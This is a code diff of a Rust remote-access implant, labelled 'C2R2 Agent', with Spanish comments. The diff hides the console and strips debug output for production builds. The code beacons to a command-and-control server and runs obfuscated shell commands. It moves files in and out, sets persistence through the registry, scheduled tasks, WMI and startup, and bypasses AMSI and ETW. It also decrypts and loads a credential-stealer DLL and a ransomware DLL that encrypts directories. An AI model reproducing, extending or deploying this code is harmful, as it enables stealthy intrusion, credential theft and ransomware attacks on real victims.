@@ -1,4 +1,19 @@
-#![windows_subsystem = "console"]
+// Conditional windows subsystem: console for dev, windows (no console) for production
+#![cfg_attr(feature = "production", windows_subsystem = "windows")]
+#![cfg_attr(not(feature = "production"), windows_subsystem = "console")]
+
+// Macro for conditional debug printing
+// In production mode, this compiles to nothing
+// In dev mode, it prints to stdout
+#[macro_export]
+macro_rules! debug_print {
+    ($($arg:tt)*) => {
+        #[cfg(feature = "dev")]
+        {
+            println!($($arg)*);
+        }
+    };
+}
 
 mod config;
 mod evasion;
@@ -20,8 +35,8 @@ use std::path::Path;
 const DELIMITER: &str = "\n<<END>>\n";
 
 fn main() {
-    println!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
-    println!("DEBUG: Conectando a {}", config::C2_SERVER);
+    debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
+    debug_print!("DEBUG: Conectando a {}", config::C2_SERVER);
     
     // Configuración de beacon (60s con 30% jitter por defecto)
     let beacon_config = beacon::BeaconConfig::default();
@@ -30,19 +45,19 @@ fn main() {
     loop {
         match TcpStream::connect(config::C2_SERVER) {
             Ok(stream) => {
-                println!("DEBUG: Conectado al servidor C2");
+                debug_print!("DEBUG: Conectado al servidor C2");
                 retry_count = 0; // Reset retry counter on successful connection
                 handle_connection(stream, &beacon_config);
-                println!("DEBUG: Conexión cerrada");
+                debug_print!("DEBUG: Conexión cerrada");
             }
             Err(e) => {
-                println!("DEBUG: Error de conexión: {}", e);
+                debug_print!("DEBUG: Error de conexión: {}", e);
             }
         }
         
         // Calcular intervalo de retry con exponential backoff
         let retry_interval = beacon::calculate_retry_interval(&beacon_config, retry_count);
-        println!("DEBUG: Reintentando en {} segundos...", retry_interval.as_secs());
+        debug_print!("DEBUG: Reintentando en {} segundos...", retry_interval.as_secs());
         beacon::beacon_sleep(retry_interval);
         retry_count += 1;
     }
@@ -61,25 +76,25 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
             Ok(0) => break,
             Ok(_) => {
                 let command = buffer.trim();
-                println!("DEBUG: Comando recibido: {}", command);
+                debug_print!("DEBUG: Comando recibido: {}", command);
 
                 if command.starts_with("__PERSIST__:") {
                     // Comando de persistencia: __PERSIST__:registry|task|wmi|startup
                     let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
-                    println!("DEBUG: Estableciendo persistencia: {}", method);
+                    debug_print!("DEBUG: Estableciendo persistencia: {}", method);
                     let response = handle_persistence(method);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command == "__PERSIST_REMOVE__" {
                     // Comando para remover persistencia
-                    println!("DEBUG: Removiendo persistencia");
+                    debug_print!("DEBUG: Removiendo persistencia");
                     let response = handle_persistence_remove();
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__BEACON__:") {
                     // Comando para cambiar configuración de beacon: __BEACON__:60:30
                     let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
-                    println!("DEBUG: Cambiando configuración beacon: {}", config_str);
+                    debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
                     let response = format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
@@ -88,33 +103,33 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                 } else if command.starts_with("__DOWNLOAD__:") {
                     // Formato: __DOWNLOAD__:ruta_del_archivo
                     let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
-                    println!("DEBUG: Descargando archivo: {}", path);
+                    debug_print!("DEBUG: Descargando archivo: {}", path);
                     let response = download_file(path);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__UPLOAD__|") {
                     // Formato: __UPLOAD__|ruta_destino|datos_base64
-                    println!("DEBUG: Procesando upload...");
+                    debug_print!("DEBUG: Procesando upload...");
                     let response = upload_file(command);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command == "__HARVEST__" {
                     // Comando para robar credenciales usando DLL encriptada
-                    println!("DEBUG: Harvesting credenciales...");
+                    debug_print!("DEBUG: Harvesting credenciales...");
                     let response = harvest_credentials();
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__ENCRYPT__:") {
                     // Comando para encriptar archivos: __ENCRYPT__:ruta|max_depth
                     let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
-                    println!("DEBUG: Encrypting files: {}", params);
+                    debug_print!("DEBUG: Encrypting files: {}", params);
                     let response = encrypt_files(params);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__DECRYPT__:") {
                     // Comando para desencriptar archivos: __DECRYPT__:ruta|key|max_depth
                     let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
-                    println!("DEBUG: Decrypting files: {}", params);
+                    debug_print!("DEBUG: Decrypting files: {}", params);
                     let response = decrypt_files(params);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
@@ -132,7 +147,7 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
 }
 
 fn send_sysinfo(writer: &mut TcpStream) {
-    println!("DEBUG: Recopilando información del sistema...");
+    debug_print!("DEBUG: Recopilando información del sistema...");
     
     // Recopilar toda la información de una vez
     let hostname = get_system_info("hostname");
@@ -146,10 +161,10 @@ fn send_sysinfo(writer: &mut TcpStream) {
         hostname, username, os, privileges
     );
     
-    println!("DEBUG: Enviando información del sistema...");
+    debug_print!("DEBUG: Enviando información del sistema...");
     writer.write_all(sysinfo.as_bytes()).ok();
     writer.flush().ok();
-    println!("DEBUG: Información enviada");
+    debug_print!("DEBUG: Información enviada");
 }
 
 fn get_system_info(info_type: &str) -> String {
@@ -172,8 +187,8 @@ fn get_system_info(info_type: &str) -> String {
 fn execute_command(command: &str) -> String {
     // Apply command obfuscation
     let obfuscated_cmd = argfuscator::obfuscate(command);
-    println!("DEBUG: Comando original: {}", command);
-    println!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
+    debug_print!("DEBUG: Comando original: {}", command);
+    debug_print!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
     
     let output = Command::new("cmd").args(&["/C", &obfuscated_cmd]).output();
     match output {
@@ -187,7 +202,7 @@ fn execute_command(command: &str) -> String {
 }
 
 fn download_file(file_path: &str) -> String {
-    println!("DEBUG: Intentando leer archivo: {}", file_path);
+    debug_print!("DEBUG: Intentando leer archivo: {}", file_path);
     
     match fs::read(file_path) {
         Ok(file_data) => {
@@ -197,11 +212,11 @@ fn download_file(file_path: &str) -> String {
                 .and_then(|n| n.to_str())
                 .unwrap_or("unknown");
             
-            println!("DEBUG: Archivo leído, {} bytes", file_data.len());
+            debug_print!("DEBUG: Archivo leído, {} bytes", file_data.len());
             format!("__FILE__:{}:{}:{}{}", file_name, file_data.len(), encoded, DELIMITER)
         }
         Err(e) => {
-            println!("DEBUG: Error leyendo archivo: {}", e);
+            debug_print!("DEBUG: Error leyendo archivo: {}", e);
             format!("__ERROR__:No se pudo leer el archivo: {}{}", e, DELIMITER)
         }
     }
@@ -218,25 +233,25 @@ fn upload_file(command: &str) -> String {
     let dest_path = parts[1];
     let encoded_data = parts[2].trim(); // TRIM para eliminar \n y espacios
     
-    println!("DEBUG: Decodificando {} bytes de base64", encoded_data.len());
-    println!("DEBUG: Ruta destino: {}", dest_path);
+    debug_print!("DEBUG: Decodificando {} bytes de base64", encoded_data.len());
+    debug_print!("DEBUG: Ruta destino: {}", dest_path);
     
     match base64_decode(encoded_data) {
         Ok(file_data) => {
-            println!("DEBUG: Escribiendo {} bytes a {}", file_data.len(), dest_path);
+            debug_print!("DEBUG: Escribiendo {} bytes a {}", file_data.len(), dest_path);
             match fs::write(dest_path, file_data) {
                 Ok(_) => {
-                    println!("DEBUG: Archivo guardado exitosamente");
+                    debug_print!("DEBUG: Archivo guardado exitosamente");
                     format!("__SUCCESS__:Archivo guardado en {}{}", dest_path, DELIMITER)
                 }
                 Err(e) => {
-                    println!("DEBUG: Error guardando archivo: {}", e);
+                    debug_print!("DEBUG: Error guardando archivo: {}", e);
                     format!("__ERROR__:Error guardando archivo: {}{}", e, DELIMITER)
                 }
             }
         }
         Err(e) => {
-            println!("DEBUG: Error decodificando base64: {}", e);
+            debug_print!("DEBUG: Error decodificando base64: {}", e);
             format!("__ERROR__:Error decodificando datos: {}{}", e, DELIMITER)
         }
     }
@@ -310,7 +325,7 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
 /// El servidor ya subió stealer.enc y stealer.key con /upload
 /// Ahora solo cargamos, desencriptamos y ejecutamos
 fn harvest_credentials() -> String {
-    println!("DEBUG: Harvesting credentials...");
+    debug_print!("DEBUG: Harvesting credentials...");
     
     #[cfg(not(target_os = "windows"))]
     {
@@ -339,27 +354,27 @@ fn harvest_credentials() -> String {
             Err(e) => return format!("__ERROR__:Error leyendo stealer.key: {}{}", e, DELIMITER),
         };
         
-        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
-        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
+        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        debug_print!("DEBUG: Clave XOR: {} bytes", xor_key.len());
         
         // Desencriptar DLL
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
-        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
         // === EVASIÓN AGRESIVA ===
-        println!("DEBUG: [EVASION] Bypassing AMSI...");
+        debug_print!("DEBUG: [EVASION] Bypassing AMSI...");
         unsafe {
             if evasion::bypass_amsi() {
-                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
+                debug_print!("DEBUG: [EVASION] ✅ AMSI bypassed");
             } else {
-                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed (puede no estar disponible)");
+                debug_print!("DEBUG: [EVASION] ⚠️ AMSI bypass failed (puede no estar disponible)");
             }
             
-            println!("DEBUG: [EVASION] Bypassing ETW...");
+            debug_print!("DEBUG: [EVASION] Bypassing ETW...");
             if evasion::bypass_etw() {
-                println!("DEBUG: [EVASION] ✅ ETW bypassed");
+                debug_print!("DEBUG: [EVASION] ✅ ETW bypassed");
             } else {
-                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
+                debug_print!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
             }
         }
         
@@ -373,7 +388,7 @@ fn harvest_credentials() -> String {
         let random_name = format!("~tmp{}.tmp", std::process::id());
         let dll_path = temp_dir.join(random_name);
         
-        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+        debug_print!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
         if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
             return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
         }
@@ -388,7 +403,7 @@ fn harvest_credentials() -> String {
                 return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
             }
             
-            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+            debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
             
             // GetProcAddress
             let fn_name = CString::new("steal_credentials").unwrap();
@@ -400,13 +415,13 @@ fn harvest_credentials() -> String {
                 return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
             }
             
-            println!("DEBUG: [EVASION] ✅ Function found, executing...");
+            debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");
             
             // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
-            println!("DEBUG: [EVASION] Calling steal_credentials()...");
+            debug_print!("DEBUG: [EVASION] Calling steal_credentials()...");
             let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn();
-            println!("DEBUG: [EVASION] steal_credentials() returned: {:p}", result_ptr);
+            debug_print!("DEBUG: [EVASION] steal_credentials() returned: {:p}", result_ptr);
             
             if result_ptr.is_null() {
                 FreeLibrary(h_module);
@@ -436,7 +451,7 @@ fn harvest_credentials() -> String {
         fs::remove_file("stealer.enc").ok();
         fs::remove_file("stealer.key").ok();
         
-        println!("DEBUG: Resultado obtenido: {} bytes", result.len());
+        debug_print!("DEBUG: Resultado obtenido: {} bytes", result.len());
         
         // Verificar si hubo error
         if result.starts_with("ERROR:") {
@@ -471,11 +486,11 @@ fn handle_persistence(method_str: &str) -> String {
     
     match persistence::establish_persistence(method) {
         Ok(msg) => {
-            println!("DEBUG: [PERSISTENCE] ✅ {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE] ✅ {}", msg);
             format!("__SUCCESS__:{}{}", msg, DELIMITER)
         }
         Err(e) => {
-            println!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
+            debug_print!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
             format!("__ERROR__:Error estableciendo persistencia: {}{}", e, DELIMITER)
         }
     }
@@ -485,11 +500,11 @@ fn handle_persistence(method_str: &str) -> String {
 fn handle_persistence_remove() -> String {
     match persistence::remove_persistence() {
         Ok(msg) => {
-            println!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
             format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
         }
         Err(e) => {
-            println!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
+            debug_print!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
             format!("__ERROR__:Error removiendo persistencia: {}{}", e, DELIMITER)
         }
     }
@@ -498,7 +513,7 @@ fn handle_persistence_remove() -> String {
 /// Encripta archivos usando la DLL de ransomware
 /// Parámetros: ruta:max_depth
 fn encrypt_files(params: &str) -> String {
-    println!("DEBUG: Encrypting files with params: {}", params);
+    debug_print!("DEBUG: Encrypting files with params: {}", params);
     
     #[cfg(not(target_os = "windows"))]
     {
@@ -515,7 +530,7 @@ fn encrypt_files(params: &str) -> String {
         let path = parts[0].trim();
         let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);
         
-        println!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);
+        debug_print!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);
         
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
@@ -537,27 +552,27 @@ fn encrypt_files(params: &str) -> String {
             Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
         };
         
-        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
-        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
+        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        debug_print!("DEBUG: Clave XOR: {} bytes", xor_key.len());
         
         // Desencriptar DLL
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
-        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
         // Evasión
-        println!("DEBUG: [EVASION] Bypassing AMSI...");
+        debug_print!("DEBUG: [EVASION] Bypassing AMSI...");
         unsafe {
             if evasion::bypass_amsi() {
-                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
+                debug_print!("DEBUG: [EVASION] ✅ AMSI bypassed");
             } else {
-                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed");
+                debug_print!("DEBUG: [EVASION] ⚠️ AMSI bypass failed");
             }
             
-            println!("DEBUG: [EVASION] Bypassing ETW...");
+            debug_print!("DEBUG: [EVASION] Bypassing ETW...");
             if evasion::bypass_etw() {
-                println!("DEBUG: [EVASION] ✅ ETW bypassed");
+                debug_print!("DEBUG: [EVASION] ✅ ETW bypassed");
             } else {
-                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
+                debug_print!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
             }
         }
         
@@ -570,7 +585,7 @@ fn encrypt_files(params: &str) -> String {
         let random_name = format!("~tmp{}.tmp", std::process::id());
         let dll_path = temp_dir.join(random_name);
         
-        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+        debug_print!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
         if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
             return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
         }
@@ -584,7 +599,7 @@ fn encrypt_files(params: &str) -> String {
                 return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
             }
             
-            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+            debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
             
             let fn_name = CString::new("encrypt_directory").unwrap();
             let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
@@ -595,7 +610,7 @@ fn encrypt_files(params: &str) -> String {
                 return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
             }
             
-            println!("DEBUG: [EVASION] ✅ Function found, executing...");
+            debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");
             
             // Ejecutar función
             let path_c = CString::new(path).unwrap();
@@ -627,7 +642,7 @@ fn encrypt_files(params: &str) -> String {
             // FreeLibrary(h_module);  // ❌ COMENTADO: No descargar DLL
             // let _ = std::fs::remove_file(&dll_path);  // ❌ COMENTADO: No eliminar archivo
             
-            println!("DEBUG: DLL permanece cargada para el diálogo persistente");
+            debug_print!("DEBUG: DLL permanece cargada para el diálogo persistente");
             
             result_str
         };
@@ -636,7 +651,7 @@ fn encrypt_files(params: &str) -> String {
         fs::remove_file("ransomware.enc").ok();
         fs::remove_file("ransomware.key").ok();
         
-        println!("DEBUG: Resultado obtenido: {}", result);
+        debug_print!("DEBUG: Resultado obtenido: {}", result);
         
         // Verificar si hubo error
         if result.starts_with("ERROR:") {
@@ -650,7 +665,7 @@ fn encrypt_files(params: &str) -> String {
 /// Desencripta archivos usando la DLL de ransomware
 /// Parámetros: ruta:key:max_depth
 fn decrypt_files(params: &str) -> String {
-    println!("DEBUG: Decrypting files with params: {}", params);
+    debug_print!("DEBUG: Decrypting files with params: {}", params);
     
     #[cfg(not(target_os = "windows"))]
     {
@@ -674,7 +689,7 @@ fn decrypt_files(params: &str) -> String {
             .replace("←[201~", "");
         let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);
         
-        println!("DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}", path, key_hex, max_depth);
+        debug_print!("DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}", path, key_hex, max_depth);
         
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
@@ -696,11 +711,11 @@ fn decrypt_files(params: &str) -> String {
             Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
         };
         
-        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
         
         // Desencriptar DLL
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
-        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
         // Evasión
         unsafe {
@@ -771,7 +786,7 @@ fn decrypt_files(params: &str) -> String {
         fs::remove_file("ransomware.enc").ok();
         fs::remove_file("ransomware.key").ok();
         
-        println!("DEBUG: Resultado obtenido: {}", result);
+        debug_print!("DEBUG: Resultado obtenido: {}", result);
         
         // Verificar si hubo error
         if result.starts_with("ERROR:") {
